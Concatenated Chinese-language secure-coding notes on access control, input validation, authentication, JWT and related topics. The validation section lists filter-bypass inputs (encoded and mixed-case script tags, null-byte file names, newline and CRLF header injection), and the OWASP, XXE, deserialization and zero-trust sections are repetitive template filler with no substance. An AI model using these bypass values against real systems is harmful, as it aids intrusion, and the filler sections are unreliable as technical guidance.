# RBAC 实现
from functools import wraps

def require_role(role):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if current_user.role != role:
                abort(403)
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/admin')
@require_role('admin')
def admin_panel():
    return "Admin Panel"
```

## 5. 错误处理与日志

### 5.1 安全错误处理

```python
# 生产环境不暴露堆栈
@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(f"Unhandled error: {e}", exc_info=True)
    return "Internal Server Error", 500

# 不泄露敏感信息
@app.errorhandler(404)
def not_found(e):
    return "Not Found", 404  # 不暴露路径结构
```

### 5.2 安全日志

```python
import logging

# 不记录敏感数据
def safe_log(message, **kwargs):
    # 过滤敏感字段
    sensitive = ['password', 'token', 'secret', 'credit_card']
    for key in sensitive:
        if key in kwargs:
            kwargs[key] = '***'
    logging.info(message, extra=kwargs)
```

## 6. 依赖安全

### 6.1 依赖管理

```bash
# 检查已知漏洞
npm audit          # Node.js
pip audit          # Python
snyk test          # 多语言
trivy fs .         # 容器/文件系统
```

### 6.2 锁定依赖

```json
// package-lock.json
// 确保可重复构建
"integrity": "sha512-..."
```

## 7. 代码审计

### 7.1 审计清单

| 类别     | 检查项             |
| -------- | ------------------ |
| 输入验证 | 所有输入是否验证   |
| 输出编码 | 是否正确编码       |
| 认证     | 密码存储、会话管理 |
| 授权     | 访问控制是否完整   |
| 加密     | 是否使用强加密     |
| 错误处理 | 是否泄露信息       |
| 日志     | 是否记录安全事件   |
| 依赖     | 是否有已知漏洞     |

### 7.2 自动化工具

| 工具      | 语言   | 类型 |
| --------- | ------ | ---- |
| SonarQube | 多语言 | SAST |
| Semgrep   | 多语言 | SAST |
| Bandit    | Python | SAST |
| Brakeman  | Ruby   | SAST |
| CodeQL    | 多语言 | SAST |



<!-- ============ 文档分隔线：033-cybersecurity/026-InputValidation.md ============ -->



## 1. 输入验证原则

### 1.1 核心原则

| 原则             | 描述                       |
| ---------------- | -------------------------- |
| 不信任任何输入   | 所有外部数据都不可信       |
| 白名单优于黑名单 | 定义允许的输入，而非禁止的 |
| 纵深验证         | 多层验证                   |
| 尽早验证         | 在数据入口处验证           |
| 一致验证         | 前后端使用相同规则         |

### 1.2 输入来源

| 来源     | 示例                        |
| -------- | --------------------------- |
| 表单数据 | 用户名、密码、搜索词        |
| URL 参数 | `?id=1&page=2`              |
| HTTP 头  | Cookie、User-Agent、Referer |
| 文件上传 | 文件名、文件内容            |
| API 请求 | JSON/XML 请求体             |
| 数据库   | 二次注入                    |
| 环境变量 | 配置注入                    |

## 2. 验证策略

### 2.1 白名单验证

```python
import re

# 用户名：仅允许字母数字下划线
def validate_username(value):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', value):
        raise ValueError("Invalid username")
    return value

# 颜色值
def validate_color(value):
    if value not in ['red', 'green', 'blue', 'yellow']:
        raise ValueError("Invalid color")
    return value

# 枚举类型
def validate_status(value):
    valid = {'active', 'inactive', 'pending'}
    if value not in valid:
        raise ValueError("Invalid status")
    return value
```

### 2.2 数据类型验证

```python
# 整数验证
def validate_int(value, min_val=None, max_val=None):
    try:
        num = int(value)
    except (ValueError, TypeError):
        raise ValueError("Must be an integer")
    if min_val is not None and num < min_val:
        raise ValueError(f"Must be >= {min_val}")
    if max_val is not None and num > max_val:
        raise ValueError(f"Must be <= {max_val}")
    return num

# 邮箱验证
def validate_email(value):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, value):
        raise ValueError("Invalid email format")
    return value

# URL 验证
def validate_url(value):
    from urllib.parse import urlparse
    try:
        result = urlparse(value)
        if result.scheme not in ('http', 'https'):
            raise ValueError("Only HTTP/HTTPS allowed")
        if not result.hostname:
            raise ValueError("Invalid URL")
        return value
    except Exception:
        raise ValueError("Invalid URL format")
```

### 2.3 长度与范围验证

```python
def validate_string(value, min_len=0, max_len=255):
    if not isinstance(value, str):
        raise ValueError("Must be a string")
    if len(value) < min_len:
        raise ValueError(f"Too short (min {min_len})")
    if len(value) > max_len:
        raise ValueError(f"Too long (max {max_len})")
    return value
```

## 3. 数据净化

### 3.1 HTML 净化

```python
import bleach

# 允许安全标签
clean_html = bleach.clean(
    user_input,
    tags=['b', 'i', 'u', 'a', 'p', 'br'],
    attributes={'a': ['href', 'title']},
    protocols=['https']
)
```

### 3.2 SQL 净化

```python
#  正确：参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

#  错误：字符串拼接
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 3.3 OS 命令净化

```python
import shlex

# 安全引用
safe_arg = shlex.quote(user_input)
os.system(f"ping -c 3 {safe_arg}")
```

### 3.4 文件路径净化

```python
import os

def sanitize_path(base_dir, filename):
    # 移除路径遍历字符
    filename = os.path.basename(filename)
    # 规范化并验证
    full_path = os.path.normpath(os.path.join(base_dir, filename))
    if not full_path.startswith(os.path.abspath(base_dir)):
        raise ValueError("Invalid path")
    return full_path
```

## 4. 常见绕过技术

### 4.1 编码绕过

| 编码方式  | 示例                 | 绕过目标    |
| --------- | -------------------- | ----------- |
| URL 编码  | `%3Cscript%3E`       | `<script>`  |
| 双重编码  | `%253C`              | `%3C` → `<` |
| HTML 实体 | `&#60;script&#62;`   | `<script>`  |
| Unicode   | `\u003cscript\u003e` | `<script>`  |
| Base64    | `PHNjcmlwdD4=`       | `<script>`  |

### 4.2 大小写混合

```
<ScRiPt>alert(1)</ScRiPt>
SeLeCt * FrOm users
```

### 4.3 空字节注入

```
file.php%00.jpg   → 服务器截断为 file.php
<scr\x00ipt>      → 某些过滤器跳过空字节
```

### 4.4 换行注入

```
username=admin\nisAdmin=true
Header: value\r\nX-Injected: true
```

## 5. 框架级验证

### 5.1 Python（Pydantic）

```python
from pydantic import BaseModel, EmailStr, validator

class UserCreate(BaseModel):
    username: str
    email: EmailStr
    age: int

    @validator('username')
    def validate_username(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', v):
            raise ValueError('Invalid username')
        return v

    @validator('age')
    def validate_age(cls, v):
        if not (0 < v < 150):
            raise ValueError('Invalid age')
        return v
```

### 5.2 JavaScript（Joi/Zod）

```javascript
import { z } from 'zod';

const UserSchema = z.object({
  username: z
    .string()
    .min(3)
    .max(20)
    .regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email(),
  age: z.number().int().min(1).max(149),
});
```

## 6. 验证最佳实践

| 实践        | 描述                 |
| ----------- | -------------------- |
| 前端验证    | 用户体验（不可依赖） |
| 后端验证    | 安全保障（必须）     |
| 数据库约束  | 最后一道防线         |
| 类型系统    | 编译时检查           |
| Schema 验证 | API 层统一验证       |
| 日志记录    | 记录验证失败事件     |



<!-- ============ 文档分隔线：033-cybersecurity/027-AuthenticationAuthorization.md ============ -->



## 1. 身份认证

### 1.1 认证方式

| 方式           | 安全性 | 用户体验 | 典型场景   |
| -------------- | ------ | -------- | ---------- |
| 密码           | 低     | 好       | 基础认证   |
| MFA            | 高     | 中       | 高安全场景 |
| 证书           | 高     | 差       | 企业内网   |
| 生物识别       | 中     | 好       | 移动设备   |
| SSO            | 中     | 好       | 企业应用   |
| FIDO2/WebAuthn | 最高   | 好       | 现代认证   |

### 1.2 密码认证

**安全要求**：

| 要求     | 描述                 |
| -------- | -------------------- |
| 最小长度 | 8+ 字符              |
| 复杂度   | 大小写+数字+特殊字符 |
| 哈希存储 | Bcrypt/Argon2id      |
| 盐值     | 每用户唯一盐         |
| 速率限制 | 防暴力破解           |
| 锁定策略 | 失败 N 次锁定        |

### 1.3 多因素认证（MFA）

```
因素类型：
- 知识因素（Something you know）：密码、PIN
- 持有因素（Something you have）：手机、Token
- 固有因素（Something you are）：指纹、面部
```

**TOTP 实现**：

```python
import pyotp

# 生成密钥
secret = pyotp.random_base32()

# 生成 TOTP
totp = pyotp.TOTP(secret)
current_code = totp.now()

# 验证
totp.verify(user_input_code)
```

## 2. OAuth 2.0

### 2.1 角色定义

| 角色                 | 描述               |
| -------------------- | ------------------ |
| Resource Owner       | 资源所有者（用户） |
| Client               | 第三方应用         |
| Authorization Server | 授权服务器         |
| Resource Server      | 资源服务器         |

### 2.2 授权类型

| 类型                      | 用途       | 安全性 |
| ------------------------- | ---------- | ------ |
| Authorization Code        | Web 应用   | 推荐   |
| Authorization Code + PKCE | SPA/移动端 | 最推荐 |
| Client Credentials        | 服务器间   |        |
| Device Code               | IoT 设备   |        |
| Implicit                  | SPA（旧）  | 已废弃 |
| Resource Owner Password   | 信任应用   | 已废弃 |

### 2.3 Authorization Code 流程

```
1. Client → Authorization Server: 授权请求
2. User → Authorization Server: 同意授权
3. Authorization Server → Client: 授权码
4. Client → Authorization Server: 用授权码换 Token
5. Authorization Server → Client: Access Token + Refresh Token
6. Client → Resource Server: 用 Token 访问资源
```

### 2.4 PKCE 扩展

```javascript
// 生成 code_verifier 和 code_challenge
const codeVerifier = generateRandomString(128);
const codeChallenge = base64UrlEncode(sha256(codeVerifier));

// 授权请求带上 code_challenge
// Token 请求带上 code_verifier
```

## 3. JWT（JSON Web Token）

### 3.1 结构

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123
```

**Header**：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload**：

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622
}
```

### 3.2 安全注意事项

| 问题       | 防御                          |
| ---------- | ----------------------------- |
| 算法篡改   | 服务端强制指定算法            |
| 密钥强度   | HS256 使用 256+ 位密钥        |
| Token 泄露 | HttpOnly Cookie 或短期 Token  |
| 无效撤销   | 黑名单/短期过期+Refresh Token |
| 敏感信息   | 不在 Payload 中存储敏感数据   |

### 3.3 代码示例

```python
import jwt
from datetime import datetime, timedelta

SECRET = "your-secret-key"

# 生成 Token
token = jwt.encode({
    "sub": "user123",
    "iat": datetime.utcnow(),
    "exp": datetime.utcnow() + timedelta(hours=1)
}, SECRET, algorithm="HS256")

# 验证 Token
try:
    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
except jwt.ExpiredSignatureError:
    print("Token expired")
except jwt.InvalidTokenError:
    print("Invalid token")
```

## 4. 访问控制模型

### 4.1 RBAC（基于角色）

```
用户 → 角色 → 权限

admin    → [read, write, delete, manage_users]
editor   → [read, write]
viewer   → [read]
```

```python
class RBAC:
    def __init__(self):
        self.roles = {}

    def add_role(self, role, permissions):
        self.roles[role] = set(permissions)

    def check_permission(self, user_role, permission):
        return permission in self.roles.get(user_role, set())
```

### 4.2 ABAC（基于属性）

```
访问决策 = f(主体属性, 资源属性, 环境属性, 操作)

示例：
- 主体：部门=财务, 级别=经理
- 资源：类型=报表, 密级=机密
- 环境：时间=工作时间, IP=内网
- 操作：读取
→ 允许
```

### 4.3 常见访问控制漏洞

| 漏洞     | 描述                   | 防御              |
| -------- | ---------------------- | ----------------- |
| 水平越权 | 访问同级别其他用户数据 | 检查资源所有权    |
| 垂直越权 | 低权限访问高权限功能   | 服务端权限检查    |
| IDOR     | 不安全的直接对象引用   | 间接引用+权限验证 |
| 缺失检查 | 某些接口未验证权限     | 统一中间件检查    |

## 5. 会话管理

### 5.1 Session vs Token

| 对比项   | Session    | JWT      |
| -------- | ---------- | -------- |
| 存储位置 | 服务端     | 客户端   |
| 状态     | 有状态     | 无状态   |
| 扩展性   | 需共享存储 | 天然支持 |
| 撤销     | 即时       | 困难     |
| 大小     | 小         | 较大     |

### 5.2 安全配置

```python
# Flask Session 安全配置
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=3600,
    SECRET_KEY=os.urandom(32),
)
```

## 6. 零信任架构

### 6.1 核心原则

- 永不信任，始终验证
- 最小权限
- 假设已被入侵
- 微分段

### 6.2 实现要素

| 要素     | 描述             |
| -------- | ---------------- |
| 身份验证 | 每次请求都验证   |
| 设备验证 | 检查设备安全状态 |
| 微分段   | 细粒度网络隔离   |
| 最小权限 | 按需授权         |
| 持续监控 | 实时风险评估     |



<!-- ============ 文档分隔线：033-cybersecurity/028-OWASPTop10Detailed.md ============ -->



## 1. 注入与身份认证

### 1.1 A01 权限控制失效

A01 权限控制失效是OWASP-Top-10详解的重要组成部分。本节详细介绍A01 权限控制失效的核心概念、工作原理和实际应用。

**关键要点**：

- A01 权限控制失效的定义与核心原理
- A01 权限控制失效的实现方式与技术细节
- A01 权限控制失效在实际场景中的应用与最佳实践
- A01 权限控制失效的常见问题与解决方案

A01 权限控制失效在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 A02 加密失败

A02 加密失败是OWASP-Top-10详解的重要组成部分。本节详细介绍A02 加密失败的核心概念、工作原理和实际应用。

**关键要点**：

- A02 加密失败的定义与核心原理
- A02 加密失败的实现方式与技术细节
- A02 加密失败在实际场景中的应用与最佳实践
- A02 加密失败的常见问题与解决方案

A02 加密失败在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.3 A03 注入

A03 注入是OWASP-Top-10详解的重要组成部分。本节详细介绍A03 注入的核心概念、工作原理和实际应用。

**关键要点**：

- A03 注入的定义与核心原理
- A03 注入的实现方式与技术细节
- A03 注入在实际场景中的应用与最佳实践
- A03 注入的常见问题与解决方案

A03 注入在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 设计与配置

### 2.1 A04 不安全设计

A04 不安全设计是OWASP-Top-10详解的重要组成部分。本节详细介绍A04 不安全设计的核心概念、工作原理和实际应用。

**关键要点**：

- A04 不安全设计的定义与核心原理
- A04 不安全设计的实现方式与技术细节
- A04 不安全设计在实际场景中的应用与最佳实践
- A04 不安全设计的常见问题与解决方案

A04 不安全设计在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 A05 安全配置错误

A05 安全配置错误是OWASP-Top-10详解的重要组成部分。本节详细介绍A05 安全配置错误的核心概念、工作原理和实际应用。

**关键要点**：

- A05 安全配置错误的定义与核心原理
- A05 安全配置错误的实现方式与技术细节
- A05 安全配置错误在实际场景中的应用与最佳实践
- A05 安全配置错误的常见问题与解决方案

A05 安全配置错误在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 依赖与数据

### 3.1 A06 易受攻击组件

A06 易受攻击组件是OWASP-Top-10详解的重要组成部分。本节详细介绍A06 易受攻击组件的核心概念、工作原理和实际应用。

**关键要点**：

- A06 易受攻击组件的定义与核心原理
- A06 易受攻击组件的实现方式与技术细节
- A06 易受攻击组件在实际场景中的应用与最佳实践
- A06 易受攻击组件的常见问题与解决方案

A06 易受攻击组件在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 A07 身份认证失败

A07 身份认证失败是OWASP-Top-10详解的重要组成部分。本节详细介绍A07 身份认证失败的核心概念、工作原理和实际应用。

**关键要点**：

- A07 身份认证失败的定义与核心原理
- A07 身份认证失败的实现方式与技术细节
- A07 身份认证失败在实际场景中的应用与最佳实践
- A07 身份认证失败的常见问题与解决方案

A07 身份认证失败在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 软件与日志

### 4.1 A08 软件与数据完整性失败

A08 软件与数据完整性失败是OWASP-Top-10详解的重要组成部分。本节详细介绍A08 软件与数据完整性失败的核心概念、工作原理和实际应用。

**关键要点**：

- A08 软件与数据完整性失败的定义与核心原理
- A08 软件与数据完整性失败的实现方式与技术细节
- A08 软件与数据完整性失败在实际场景中的应用与最佳实践
- A08 软件与数据完整性失败的常见问题与解决方案

A08 软件与数据完整性失败在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 A09 日志监控不足

A09 日志监控不足是OWASP-Top-10详解的重要组成部分。本节详细介绍A09 日志监控不足的核心概念、工作原理和实际应用。

**关键要点**：

- A09 日志监控不足的定义与核心原理
- A09 日志监控不足的实现方式与技术细节
- A09 日志监控不足在实际场景中的应用与最佳实践
- A09 日志监控不足的常见问题与解决方案

A09 日志监控不足在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.3 A10 服务器端请求伪造

A10 服务器端请求伪造是OWASP-Top-10详解的重要组成部分。本节详细介绍A10 服务器端请求伪造的核心概念、工作原理和实际应用。

**关键要点**：

- A10 服务器端请求伪造的定义与核心原理
- A10 服务器端请求伪造的实现方式与技术细节
- A10 服务器端请求伪造在实际场景中的应用与最佳实践
- A10 服务器端请求伪造的常见问题与解决方案

A10 服务器端请求伪造在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/029-XXEAttack.md ============ -->



## 1. XXE 原理

### 1.1 XML 实体定义

XML 实体定义是XXE攻击的重要组成部分。本节详细介绍XML 实体定义的核心概念、工作原理和实际应用。

**关键要点**：

- XML 实体定义的定义与核心原理
- XML 实体定义的实现方式与技术细节
- XML 实体定义在实际场景中的应用与最佳实践
- XML 实体定义的常见问题与解决方案

XML 实体定义在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 外部实体注入

外部实体注入是XXE攻击的重要组成部分。本节详细介绍外部实体注入的核心概念、工作原理和实际应用。

**关键要点**：

- 外部实体注入的定义与核心原理
- 外部实体注入的实现方式与技术细节
- 外部实体注入在实际场景中的应用与最佳实践
- 外部实体注入的常见问题与解决方案

外部实体注入在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 攻击方式

### 2.1 文件读取

文件读取是XXE攻击的重要组成部分。本节详细介绍文件读取的核心概念、工作原理和实际应用。

**关键要点**：

- 文件读取的定义与核心原理
- 文件读取的实现方式与技术细节
- 文件读取在实际场景中的应用与最佳实践
- 文件读取的常见问题与解决方案

文件读取在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 SSRF

SSRF是XXE攻击的重要组成部分。本节详细介绍SSRF的核心概念、工作原理和实际应用。

**关键要点**：

- SSRF的定义与核心原理
- SSRF的实现方式与技术细节
- SSRF在实际场景中的应用与最佳实践
- SSRF的常见问题与解决方案

SSRF在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.3 盲注 XXE

盲注 XXE是XXE攻击的重要组成部分。本节详细介绍盲注 XXE的核心概念、工作原理和实际应用。

**关键要点**：

- 盲注 XXE的定义与核心原理
- 盲注 XXE的实现方式与技术细节
- 盲注 XXE在实际场景中的应用与最佳实践
- 盲注 XXE的常见问题与解决方案

盲注 XXE在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 防御措施

### 3.1 禁用外部实体

禁用外部实体是XXE攻击的重要组成部分。本节详细介绍禁用外部实体的核心概念、工作原理和实际应用。

**关键要点**：

- 禁用外部实体的定义与核心原理
- 禁用外部实体的实现方式与技术细节
- 禁用外部实体在实际场景中的应用与最佳实践
- 禁用外部实体的常见问题与解决方案

禁用外部实体在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 白名单校验

白名单校验是XXE攻击的重要组成部分。本节详细介绍白名单校验的核心概念、工作原理和实际应用。

**关键要点**：

- 白名单校验的定义与核心原理
- 白名单校验的实现方式与技术细节
- 白名单校验在实际场景中的应用与最佳实践
- 白名单校验的常见问题与解决方案

白名单校验在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.3 WAF 过滤

WAF 过滤是XXE攻击的重要组成部分。本节详细介绍WAF 过滤的核心概念、工作原理和实际应用。

**关键要点**：

- WAF 过滤的定义与核心原理
- WAF 过滤的实现方式与技术细节
- WAF 过滤在实际场景中的应用与最佳实践
- WAF 过滤的常见问题与解决方案

WAF 过滤在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 检测与工具

### 4.1 自动化扫描

自动化扫描是XXE攻击的重要组成部分。本节详细介绍自动化扫描的核心概念、工作原理和实际应用。

**关键要点**：

- 自动化扫描的定义与核心原理
- 自动化扫描的实现方式与技术细节
- 自动化扫描在实际场景中的应用与最佳实践
- 自动化扫描的常见问题与解决方案

自动化扫描在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 手动测试

手动测试是XXE攻击的重要组成部分。本节详细介绍手动测试的核心概念、工作原理和实际应用。

**关键要点**：

- 手动测试的定义与核心原理
- 手动测试的实现方式与技术细节
- 手动测试在实际场景中的应用与最佳实践
- 手动测试的常见问题与解决方案

手动测试在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/030-DeserializationVulnerability.md ============ -->



## 1. 序列化与反序列化

### 1.1 序列化机制

序列化机制是反序列化漏洞的重要组成部分。本节详细介绍序列化机制的核心概念、工作原理和实际应用。

**关键要点**：

- 序列化机制的定义与核心原理
- 序列化机制的实现方式与技术细节
- 序列化机制在实际场景中的应用与最佳实践
- 序列化机制的常见问题与解决方案

序列化机制在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 魔术方法与回调

魔术方法与回调是反序列化漏洞的重要组成部分。本节详细介绍魔术方法与回调的核心概念、工作原理和实际应用。

**关键要点**：

- 魔术方法与回调的定义与核心原理
- 魔术方法与回调的实现方式与技术细节
- 魔术方法与回调在实际场景中的应用与最佳实践
- 魔术方法与回调的常见问题与解决方案

魔术方法与回调在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 攻击原理

### 2.1 Java 反序列化

Java 反序列化是反序列化漏洞的重要组成部分。本节详细介绍Java 反序列化的核心概念、工作原理和实际应用。

**关键要点**：

- Java 反序列化的定义与核心原理
- Java 反序列化的实现方式与技术细节
- Java 反序列化在实际场景中的应用与最佳实践
- Java 反序列化的常见问题与解决方案

Java 反序列化在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 PHP 反序列化

PHP 反序列化是反序列化漏洞的重要组成部分。本节详细介绍PHP 反序列化的核心概念、工作原理和实际应用。

**关键要点**：

- PHP 反序列化的定义与核心原理
- PHP 反序列化的实现方式与技术细节
- PHP 反序列化在实际场景中的应用与最佳实践
- PHP 反序列化的常见问题与解决方案

PHP 反序列化在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.3 Python pickle

Python pickle是反序列化漏洞的重要组成部分。本节详细介绍Python pickle的核心概念、工作原理和实际应用。

**关键要点**：

- Python pickle的定义与核心原理
- Python pickle的实现方式与技术细节
- Python pickle在实际场景中的应用与最佳实践
- Python pickle的常见问题与解决方案

Python pickle在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 利用链

### 3.1 Commons Collections

Commons Collections是反序列化漏洞的重要组成部分。本节详细介绍Commons Collections的核心概念、工作原理和实际应用。

**关键要点**：

- Commons Collections的定义与核心原理
- Commons Collections的实现方式与技术细节
- Commons Collections在实际场景中的应用与最佳实践
- Commons Collections的常见问题与解决方案

Commons Collections在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 gadget chain 构造

gadget chain 构造是反序列化漏洞的重要组成部分。本节详细介绍gadget chain 构造的核心概念、工作原理和实际应用。

**关键要点**：

- gadget chain 构造的定义与核心原理
- gadget chain 构造的实现方式与技术细节
- gadget chain 构造在实际场景中的应用与最佳实践
- gadget chain 构造的常见问题与解决方案

gadget chain 构造在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 防御

### 4.1 输入校验

输入校验是反序列化漏洞的重要组成部分。本节详细介绍输入校验的核心概念、工作原理和实际应用。

**关键要点**：

- 输入校验的定义与核心原理
- 输入校验的实现方式与技术细节
- 输入校验在实际场景中的应用与最佳实践
- 输入校验的常见问题与解决方案

输入校验在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 白名单类

白名单类是反序列化漏洞的重要组成部分。本节详细介绍白名单类的核心概念、工作原理和实际应用。

**关键要点**：

- 白名单类的定义与核心原理
- 白名单类的实现方式与技术细节
- 白名单类在实际场景中的应用与最佳实践
- 白名单类的常见问题与解决方案

白名单类在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.3 替代方案

替代方案是反序列化漏洞的重要组成部分。本节详细介绍替代方案的核心概念、工作原理和实际应用。

**关键要点**：

- 替代方案的定义与核心原理
- 替代方案的实现方式与技术细节
- 替代方案在实际场景中的应用与最佳实践
- 替代方案的常见问题与解决方案

替代方案在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



<!-- ============ 文档分隔线：033-cybersecurity/031-ZeroTrustArchitecture.md ============ -->



## 1. 零信任原则

### 1.1 Never trust, always verify

Never trust, always verify是零信任架构的重要组成部分。本节详细介绍Never trust, always verify的核心概念、工作原理和实际应用。

**关键要点**：

- Never trust, always verify的定义与核心原理
- Never trust, always verify的实现方式与技术细节
- Never trust, always verify在实际场景中的应用与最佳实践
- Never trust, always verify的常见问题与解决方案

Never trust, always verify在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.2 最小权限

最小权限是零信任架构的重要组成部分。本节详细介绍最小权限的核心概念、工作原理和实际应用。

**关键要点**：

- 最小权限的定义与核心原理
- 最小权限的实现方式与技术细节
- 最小权限在实际场景中的应用与最佳实践
- 最小权限的常见问题与解决方案

最小权限在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 1.3 假设被入侵

假设被入侵是零信任架构的重要组成部分。本节详细介绍假设被入侵的核心概念、工作原理和实际应用。

**关键要点**：

- 假设被入侵的定义与核心原理
- 假设被入侵的实现方式与技术细节
- 假设被入侵在实际场景中的应用与最佳实践
- 假设被入侵的常见问题与解决方案

假设被入侵在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 2. 核心组件

### 2.1 身份代理 PEP/PDP

身份代理 PEP/PDP是零信任架构的重要组成部分。本节详细介绍身份代理 PEP/PDP的核心概念、工作原理和实际应用。

**关键要点**：

- 身份代理 PEP/PDP的定义与核心原理
- 身份代理 PEP/PDP的实现方式与技术细节
- 身份代理 PEP/PDP在实际场景中的应用与最佳实践
- 身份代理 PEP/PDP的常见问题与解决方案

身份代理 PEP/PDP在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.2 微分段

微分段是零信任架构的重要组成部分。本节详细介绍微分段的核心概念、工作原理和实际应用。

**关键要点**：

- 微分段的定义与核心原理
- 微分段的实现方式与技术细节
- 微分段在实际场景中的应用与最佳实践
- 微分段的常见问题与解决方案

微分段在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 2.3 持续验证

持续验证是零信任架构的重要组成部分。本节详细介绍持续验证的核心概念、工作原理和实际应用。

**关键要点**：

- 持续验证的定义与核心原理
- 持续验证的实现方式与技术细节
- 持续验证在实际场景中的应用与最佳实践
- 持续验证的常见问题与解决方案

持续验证在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 3. 实现框架

### 3.1 NIST SP 800-207

NIST SP 800-207是零信任架构的重要组成部分。本节详细介绍NIST SP 800-207的核心概念、工作原理和实际应用。

**关键要点**：

- NIST SP 800-207的定义与核心原理
- NIST SP 800-207的实现方式与技术细节
- NIST SP 800-207在实际场景中的应用与最佳实践
- NIST SP 800-207的常见问题与解决方案

NIST SP 800-207在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.2 Google BeyondCorp

Google BeyondCorp是零信任架构的重要组成部分。本节详细介绍Google BeyondCorp的核心概念、工作原理和实际应用。

**关键要点**：

- Google BeyondCorp的定义与核心原理
- Google BeyondCorp的实现方式与技术细节
- Google BeyondCorp在实际场景中的应用与最佳实践
- Google BeyondCorp的常见问题与解决方案

Google BeyondCorp在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 3.3 CISA ZTMM

CISA ZTMM是零信任架构的重要组成部分。本节详细介绍CISA ZTMM的核心概念、工作原理和实际应用。

**关键要点**：

- CISA ZTMM的定义与核心原理
- CISA ZTMM的实现方式与技术细节
- CISA ZTMM在实际场景中的应用与最佳实践
- CISA ZTMM的常见问题与解决方案

CISA ZTMM在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

## 4. 落地实践

### 4.1 分阶段实施

分阶段实施是零信任架构的重要组成部分。本节详细介绍分阶段实施的核心概念、工作原理和实际应用。

**关键要点**：

- 分阶段实施的定义与核心原理
- 分阶段实施的实现方式与技术细节
- 分阶段实施在实际场景中的应用与最佳实践
- 分阶段实施的常见问题与解决方案

分阶段实施在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.2 常见误区

常见误区是零信任架构的重要组成部分。本节详细介绍常见误区的核心概念、工作原理和实际应用。

**关键要点**：

- 常见误区的定义与核心原理
- 常见误区的实现方式与技术细节
- 常见误区在实际场景中的应用与最佳实践
- 常见误区的常见问题与解决方案

常见误区在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。

### 4.3 工具选型

工具选型是零信任架构的重要组成部分。本节详细介绍工具选型的核心概念、工作原理和实际应用。

**关键要点**：

- 工具选型的定义与核心原理
- 工具选型的实现方式与技术细节
- 工具选型在实际场景中的应用与最佳实践
- 工具选型的常见问题与解决方案

工具选型在工程实践中需要根据具体场景选择合适的策略，平衡性能、可靠性和复杂度。



